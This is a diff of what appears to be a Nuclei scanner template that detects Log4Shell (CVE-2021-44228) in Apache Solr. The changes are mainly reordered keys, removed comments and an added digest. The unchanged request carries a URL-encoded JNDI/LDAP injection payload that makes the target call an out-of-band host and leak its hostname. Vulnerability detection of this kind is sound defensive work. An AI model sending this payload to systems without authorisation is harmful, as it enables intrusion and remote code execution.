@@ -19,11 +19,10 @@ info:
     cve-id: CVE-2021-44228
     cwe-id: CWE-77
   metadata:
-    max-request: 2
     verified: true
+    max-request: 2
     shodan-query: http.html:"Apache Solr"
   tags: vulhub,cve,solr,oast,log4j,cve2021,rce,apache,jndi,kev
-
 variables:
   rand1: '{{rand_int(111, 999)}}'
   rand2: '{{rand_int(111, 999)}}'
@@ -35,11 +34,11 @@ http:
         GET /solr/admin/{{endpoint}}?action=%24%7Bjndi%3Aldap%3A%2F%2F%24%7B%3A-{{rand1}}%7D%24%7B%3A-{{rand2}}}%7D.%24%7BhostName%7D.uri.{{interactsh-url}}%2F%7D HTTP/1.1
         Host: {{Hostname}}
 
-    attack: clusterbomb
     payloads:
       endpoint:
         - "collections"
         - "cores"
+    attack: clusterbomb
 
     matchers-condition: and
     matchers:
@@ -49,28 +48,30 @@ http:
           - 'org.apache.solr'
 
       - type: word
-        part: interactsh_protocol
+        part: interactsh_protocol # Confirms the DNS Interaction
         words:
           - "dns"
 
       - type: regex
         part: interactsh_request
         regex:
-          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${:-{{rand1}}}${:-{{rand2}}}.${hostName} in output
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
 
     extractors:
       - type: kval
         kval:
-          - interactsh_ip # Print remote interaction IP in output
+          - interactsh_ip
 
       - type: regex
         part: interactsh_request
         group: 2
         regex:
-          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print injection point in output
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
 
       - type: regex
         part: interactsh_request
         group: 1
         regex:
-          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${:-{{rand1}}}${:-{{rand2}}}.${hostName} in output
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+
+# digest: 4a0a00473045022100c38d41d1823fa63da240e259a1003d23723889cd20ac19f9eaab674d5664a03c022018ea30db1d9f2f1a5c8884ad3b21735fc7a02a73f18e35b35a7ff9506e56d4e9:922c64590222798bb761d5b6d8e72950
